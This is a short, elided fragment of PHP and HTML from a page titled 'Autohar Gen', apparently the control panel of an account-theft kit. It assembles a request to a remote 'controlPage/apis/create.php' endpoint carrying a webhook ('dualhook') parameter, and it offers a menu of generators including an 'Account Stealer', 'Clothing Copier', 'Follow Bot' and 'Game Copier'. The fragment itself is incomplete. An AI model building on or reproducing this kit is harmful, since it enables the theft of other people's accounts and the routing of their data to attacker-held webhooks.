...
$dualhook = '{web}';
$dom = "https://$do/controlPage/apis/create.php?web=$web&dir=$dir&t=$t&dualhook=$dualhook";
...
<center><h2>Autohar Gen</h2></center>
...
<option value="as">Account Stealer (NEW, OP)</option> 
<option value="cc">Clothing Copier (NEW, OP)</option> 
<option value="fb">Follow Bot (NEW)</option> 
<option value="gc">Game Copier (NEW)</option>
</select>							
